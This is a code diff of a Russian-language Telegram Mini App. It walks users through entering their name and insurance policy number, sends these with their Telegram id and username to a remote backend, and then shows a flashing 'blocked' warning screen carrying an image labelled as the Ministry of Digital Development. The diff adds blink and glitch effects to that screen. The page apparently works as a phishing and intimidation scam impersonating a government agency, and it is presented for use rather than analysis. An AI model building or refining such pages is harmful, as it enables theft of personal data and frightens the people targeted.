@@ -11,6 +11,20 @@
     .hidden { display: none !important; }
     .fade { animation: fadeIn 0.5s; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .blink { animation: blink 1.2s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .glitch {
+      animation: glitch 2s infinite;
+      text-shadow: 2px 0 red, -2px 0 cyan;
+    }
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(2px, -2px); }
+      60% { transform: translate(-2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
     input[type="text"], input[type="tel"] {
       -webkit-appearance: none;
       -moz-appearance: textfield;
@@ -58,10 +72,10 @@
       <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 3: Полис (теперь цифровая клавиатура) -->
+    <!-- Шаг 3: Полис -->
     <div id="step3" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">Номер Вашего страхового полиса:</h3>
-      <input id="polis" type="tel" inputmode="numeric" pattern="[0-9 ]*" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
+      <input id="polis" type="text" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
       <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
@@ -105,7 +119,7 @@
       </div>
     </div>
 
-    <!-- Экран блокировки с анимацией -->
+    <!-- Экран блокировки -->
     <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600 animate-pulse">
       <div class="text-6xl text-red-600 blink mb-6">!</div>
       <img src="https://i.imgur.com/ваша_картинка_минцифр.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
@@ -187,7 +201,7 @@
         username: Telegram.WebApp.initDataUnsafe?.user?.username || 'test-username'
       };
 
-      console.log("Отправляем реальные данные:", payload);
+      console.log("Отправляем данные:", payload);
 
       const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';
 
@@ -206,23 +220,15 @@
       })
       .catch(err => {
         console.error('Ошибка fetch:', err);
-        show('blocked');
+        show('blocked');  // показываем блокировку даже при ошибке
       });
     }
-
-    // Автоматически разворачиваем Mini App на весь экран
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-    Telegram.WebApp.requestFullscreen();
 
     // Имитация Telegram.WebApp для теста в браузере
     window.Telegram = {
       WebApp: {
         initDataUnsafe: { user: { id: '123456', username: 'testuser' } },
-        sendData: (data) => console.log('Отправлено:', data),
-        ready: () => console.log('Mini App ready'),
-        expand: () => console.log('Expanded'),
-        requestFullscreen: () => console.log('Request Fullscreen')
+        sendData: (data) => console.log('Отправлено:', data)
       }
     };
   </script>
